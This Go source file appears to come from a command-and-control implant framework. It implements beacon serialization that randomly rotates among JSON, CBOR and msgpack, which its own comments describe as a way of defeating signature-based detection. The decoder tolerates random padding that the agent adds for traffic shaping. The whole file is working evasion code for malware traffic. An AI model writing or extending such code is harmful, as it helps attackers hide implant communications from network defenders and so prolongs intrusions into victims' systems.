// Package encoding provides multi-format beacon serialization with automatic
// format rotation for defeating signature-based detection.
package encoding

import (
	"bytes"
	"encoding/json"
	"fmt"
	"math/rand"
	"sync/atomic"

	"github.com/fxamacker/cbor/v2"
	"github.com/vmihailenco/msgpack/v5"
)

// Format identifiers (first byte of every encoded beacon payload)
const (
	FormatJSON byte = iota
	FormatCBOR
	FormatMsgpack
	FormatMax // sentinel — number of supported formats
)

var (
	lastFormat atomic.Uint32 // last-used format for rotation
)

// randomFormat selects a format, cycling through to avoid repeating the same format.
// Safe against FormatMax changes: returns 0 (JSON) if FormatMax <= 1.
func randomFormat() byte {
	if FormatMax <= 1 {
		lastFormat.Store(0)
		return 0
	}
	last := lastFormat.Load()
	for i := 0; i < 8; i++ {
		// #nosec G404 -- beacon format rotation, not security randomness.
		f := byte(rand.Intn(int(FormatMax))) // #nosec G404
		if f != byte(last) {
			lastFormat.Store(uint32(f))
			return f
		}
	}
	// Fallback: rotate to next format to guarantee forward progress
	next := (byte(last) + 1) % FormatMax
	lastFormat.Store(uint32(next))
	return next
}

// Marshal encodes v using a randomly selected format, prepending a format byte.
// Returns: [format_byte][encoded_data].
func Marshal(v any) ([]byte, error) {
	fmtID := randomFormat()
	var encoded []byte
	var err error

	switch fmtID {
	case FormatJSON:
		encoded, err = json.Marshal(v)
	case FormatCBOR:
		encoded, err = cbor.Marshal(v)
	case FormatMsgpack:
		encoded, err = msgpack.Marshal(v)
	default:
		encoded, err = json.Marshal(v)
		fmtID = FormatJSON
	}
	if err != nil {
		return nil, err
	}
	// Prepend format byte
	out := make([]byte, 1, 1+len(encoded))
	out[0] = fmtID
	out = append(out, encoded...)
	return out, nil
}

// Unmarshal decodes data as produced by Marshal.
// If the first byte is a known format identifier (0x00-0x02), it decodes accordingly.
// For backward compatibility, if the first byte is NOT a known format ID (e.g. plain JSON starting with '{'),
// the entire data is treated as JSON.
func Unmarshal(data []byte, v any) error {
	if len(data) < 1 {
		return fmt.Errorf("encoding: empty data")
	}
	fmtID := data[0]
	// Only interpret the first byte as a format marker if it's a known format ID.
	// Plain JSON starting with '{' (0x7B) or '[' (0x5B) is handled by the default branch.
	if fmtID < FormatMax {
		payload := data[1:]
		switch fmtID {
		case FormatJSON:
			// JSON with format marker: strip marker and decode
			if len(payload) == 0 {
				return fmt.Errorf("encoding: empty payload")
			}
			return decodeJSON(payload, v)
		case FormatCBOR:
			return cbor.Unmarshal(payload, v)
		case FormatMsgpack:
			return msgpack.Unmarshal(payload, v)
		}
	}
	// Backward compatibility: treat as plain JSON
	return decodeJSON(data, v)
}

// decodeJSON decodes the first JSON value from data, ignoring any trailing
// bytes. The agent appends random padding after the JSON payload
// (see applyTrafficShaping), so a strict json.Unmarshal on the whole slice
// would fail. json.Decoder stops after the first complete value.
func decodeJSON(data []byte, v any) error {
	return json.NewDecoder(bytes.NewReader(data)).Decode(v)
}
